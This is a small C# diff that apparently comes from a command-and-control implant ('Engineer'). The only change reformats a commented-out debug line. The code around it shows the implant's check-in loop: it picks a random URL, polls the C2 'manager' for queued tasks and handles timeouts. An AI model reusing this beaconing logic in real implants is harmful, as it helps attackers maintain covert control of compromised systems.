@@ -64,7 +64,7 @@ namespace Engineer.Models
             {
                 //pick one of the strings in the Urls list and use it for the request
                 string url = Urls[new Random().Next(Urls.Count)];
-               // Console.WriteLine("Checking in with " + _client.BaseAddress + url);
+                //Console.WriteLine("Checking in with " + _client.BaseAddress + url);
                 var taskReturned = _client.GetAsync(url, HttpCompletionOption.ResponseContentRead); // gets anything waiting at the maanger for us to read, when this happens it triggers the HandleImplant in our TS 
 
                 if (await Task.WhenAny(taskReturned, Task.Delay(Sleep + 10000)) != taskReturned || taskReturned.Status == TaskStatus.Faulted)
